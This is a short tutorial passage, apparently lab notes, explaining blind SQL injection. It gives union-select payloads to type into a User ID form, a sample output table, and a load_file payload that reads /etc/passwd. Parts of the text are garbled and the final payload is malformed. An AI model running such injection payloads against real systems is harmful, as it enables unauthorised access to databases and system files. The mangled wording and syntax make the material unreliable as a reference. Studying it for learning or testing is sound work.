  md: "# k) Understanding Blind SQL injection:\n\nBlind SQL (Structured Query Language)\
    \ injection is a type of SQL injection that attacks the database or false questions\
    \ and determines the answer based on the applications response. This attack is\
    \ often used when the web application is configured to show generic error messages,\
    \ but has not mitigated the code that is vulnerable to SQL injection.\n\nWhen\
    \ an attacker exploits SQL injection, sometimes the web application displays error\
    \ messages from the database claiming that the SQL Query's syntax is incorrect.\
    \ Blind SQL injection is nearly identical to normal SQL Injection, the only difference\
    \ is the way the data is retrieved from the database. When the database does not\
    \ output data to the web page, an attacker is forced to steal data by asking the\
    \ database a series of true or false questions. This makes exploiting the SQL\
    \ injection vulnerability more difficult, but not impossible.\n\n+   * Dependent\
    \ before in the error message. In blind SQL injection we will depend on sql injection\
    \ without errors.\n* To get the no of columns, write in the box\n\n1 union select\
    \ null,null--\n\n| User ID: | |\n|---|---|\n| ID: 1 union select null,null-- |\n\
    | First name: admin |\n| Surname: admin |\n| ID: 1 union select null,null-- |\n\
    | First name: |\n| Surname:| \n\n+   * Another technique is to write 1 union select\
    \ 1,2--\n* To load file,--\n\n1 union select, load_file (/etc/passwd)--\n\n+ \
